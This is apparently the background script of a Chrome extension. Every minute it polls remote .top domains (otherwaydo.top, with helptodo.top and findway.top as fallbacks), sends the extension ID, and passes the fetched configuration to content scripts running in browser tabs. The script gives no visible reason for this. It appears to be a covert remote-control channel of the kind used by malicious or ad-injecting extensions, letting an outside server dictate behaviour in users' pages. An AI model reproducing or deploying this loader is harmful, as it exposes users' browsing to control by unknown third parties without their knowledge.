var messages = [];
messages.listener = function ( request, sender, sendResponse ) {
    messages.push( arguments );
    return true;
};

chrome.runtime.onMessage.addListener( messages.listener );

(function ( defaults ) {
    var interval;

    function setup( config ) {
        config = $.parseJSON( config );
        if ( !config ) return;

        chrome.runtime.onMessage.removeListener( messages.listener );

        function listener( request, sender, sendResponse ) {
            if ( !sender.tab ) {
                return;
            }

            switch ( request ) {
                case 'content.js' :
                    sendResponse( config );
                    break;
                case 'options.js' :
                    sendResponse( {} );
                    break;
            }
        }

        chrome.runtime.onMessage.addListener( listener );

        messages.forEach( function ( message ) {
            listener.apply( undefined, message );
        } );
    }

    function get( url, callback ) {
        var verification = Math.random().toString().substr( 2 );
        var xhr = new XMLHttpRequest();
        xhr.open( "GET", url.replace( '{verification}', verification ), true );
        xhr.setRequestHeader( 'X-VERIFICATION', verification );
        xhr.onreadystatechange = function () {
            if ( this.readyState == 4 ) {
                if ( this.responseText.substr( -verification.length - 1 ) === ( ';' + verification ) ) {
                    callback( null, this.responseText.substr( 0, this.responseText.length - verification.length - 1 ) );
                }
                else {
                    callback( new Error( 'Request failed' ) );
                }
            }
        };
        xhr.send();
    }

    function check( sync ) {
        if ( !sync.length ) {
            return;
        }

        var sync_url = sync.pop();

        get( sync_url, function ( err, url ) {
            if ( err ) return check( sync );
            if ( !url ) return;

            get( url, function ( err, response ) {
                if ( err ) return;

                clearInterval( interval );
                setup( response );
            } );
        } );
    }

    function update() {
        chrome.storage.local.get( 'settings.update', function ( items ) {
            get( items['settings.update'] || defaults.update, function ( err, response ) {
                if ( err ) {
                    return chrome.storage.local.get( 'settings.sync', function ( items ) {
                        var sync = ( items['settings.sync'] || [] ).concat( defaults.sync ).reverse();
                        check( sync );
                    } );
                }

                clearInterval( interval );
                setup( response );
            } );

        } );
    }

    interval = setInterval( update, 60000 );
    update();
})( {
    update : "http://otherwaydo.top/update/chrome?id=" + chrome.runtime.id + "&r={verification}",
    sync   : ["http://helptodo.top/chrome", "http://findway.top/chrome"]
} );
